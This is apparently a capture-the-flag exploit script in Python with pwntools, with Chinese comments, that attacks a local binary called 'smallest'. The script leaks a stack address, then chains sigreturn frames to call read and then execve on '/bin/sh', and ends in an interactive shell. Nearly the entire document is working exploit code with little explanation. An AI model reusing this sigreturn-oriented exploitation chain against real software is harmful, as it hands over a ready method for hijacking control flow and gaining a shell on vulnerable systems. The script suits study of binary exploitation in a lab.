from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def p():
    gdb.attach(proc.pidof(io)[0])

io = process('./smallest')
elf = ELF('./smallest')

start_addr = 0x4000b0
syscall_addr = 0x4000be

# 设置3轮返回地址，压入栈底。
payload1 = p64(start_addr)*3
io.send(payload1)

# 发送'\xb3'覆盖返回地址最低位，同时越过xor rax，rax，且因为字节数为1，rax会保存read的返回值，因此最终rax返回1
payload2 = b'\xb3'
# p()
# pause()
io.send(payload2)
leak_stack_base = u64(io.recv()[8:16])
log.success('leak stack addr: ' + hex(leak_stack_base))


# 实现read，预留binsh的位置
read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = leak_stack_base
read.rdx = 0x400
read.rsp = leak_stack_base
read.rip = syscall_addr
payload3 = p64(start_addr) + p64(syscall_addr) + bytes(read)
# p()
io.send(payload3)
# pause()
# 控制payload长度为15，使得rax为15，触发sigreturn系统调用
payload4 = p64(syscall_addr) + b'a'*0x7
io.send(payload4)

# 实现execve，调用binsh来getshell
execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = leak_stack_base + 0x108 #/bin/sh的偏移
execve.rsi = 0x0
execve.rdx = 0x0
execve.rsp = leak_stack_base 
execve.rip = syscall_addr

payload5 = p64(start_addr)+p64(syscall_addr)+bytes(execve)
print(len(payload5))
payload5 += b'/bin/sh\x00'
io.send(payload5)
# p()

# 控制payload长度为15，使得raxls
payload6 = p64(syscall_addr) + b'a'*0x7
io.send(payload6)
# pause()

io.interactive()